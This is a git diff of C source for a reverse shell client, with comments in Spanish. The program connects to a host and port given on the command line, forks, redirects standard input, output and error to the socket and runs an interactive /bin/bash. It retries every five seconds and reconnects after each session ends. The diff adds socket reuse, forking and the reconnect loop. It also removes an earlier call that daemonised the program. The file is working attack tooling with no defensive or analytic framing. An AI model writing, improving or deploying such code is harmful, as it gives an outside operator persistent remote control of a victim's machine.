@@ -1,12 +1,14 @@
+#include <fcntl.h>
 #include <netdb.h>
 #include <netinet/in.h>
+#include <signal.h>
+#include <stdbool.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <unistd.h>
-
 #define SHELL "/bin/bash"
 #define MAX_BUF 1024
 
@@ -33,7 +35,21 @@ int send_message(int* sockfd, char buffer[MAX_BUF])
     return send(*sockfd, buffer, strlen(buffer), MSG_EOR | MSG_NOSIGNAL);
 }
 
-int create_socket() { return socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); }
+int create_socket()
+{
+    int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    int reuse = 1;
+
+    fcntl(sockfd, F_SETFD, FD_CLOEXEC);
+
+    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(int)) < 0)
+        error((char*)"setsockopt(SO_REUSEADDR) failed");
+
+    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(int)) < 0)
+        error((char*)"setsockopt(SO_REUSEPORT) failed");
+
+    return sockfd;
+}
 
 struct sockaddr_in create_serv_addr(char* argv[])
 {
@@ -59,30 +75,45 @@ int reconnect(int sockfd)
 int main(int argc, char* argv[])
 {
     // PUTS PROGRAM ON BACKGROUND AND CHECK PORT NUMBER
-    daemon(1, 0);
     chk_argno(&argc);
+
+    pid_t pid;
 
     char buffer[MAX_BUF];
     int sockfd = create_socket();
+    bool conn_flag = false;
     struct sockaddr_in serv_addr = create_serv_addr(argv);
-
-    // TODO  Necesito crear un thread que separe el envio y recepcion de
-    // mensajes
-    while (1) {
-        // Intento conectarme a un servidor que este escuchando conexiones.
-        if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr))
-            >= 0) {
-            memset(&buffer, 0, MAX_BUF);
+infinite_loop:
+    // Intento conectarme a un servidor que este escuchando conexiones.
+    if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) >= 0) {
+        conn_flag = true;
+        memset(&buffer, 0, MAX_BUF);
+        if ((pid = fork()) == 0) {
             for (int i = 0; i < 3; i++) {
                 close(i);
                 dup2(sockfd, i);
             }
-            execl(SHELL, SHELL, "-i", NULL);
-        } else {
-            //  Si el cliente no logra contectarse, espera 5 segundos y vuelve a
-            //  intentar
-            sleep(5);
+            execl(SHELL, SHELL, "-i", (char*)NULL);
         }
+    } else {
+        //  Si el cliente no logra contectarse, espera 5 segundos y vuelve a
+        //  intentar
+        sleep(5);
     }
+    if (conn_flag) {
+        while (recv(sockfd, buffer, sizeof(buffer), MSG_PEEK | MSG_DONTWAIT)
+            != 0) {
+            sleep(5);
+            if (strncmp(buffer, "exit\n", 6) == 0)
+                break;
+        }
+
+        kill(pid, SIGKILL);
+
+        conn_flag = !conn_flag;
+        sockfd = reconnect(sockfd);
+    }
+
+    goto infinite_loop;
     return 0;
 }
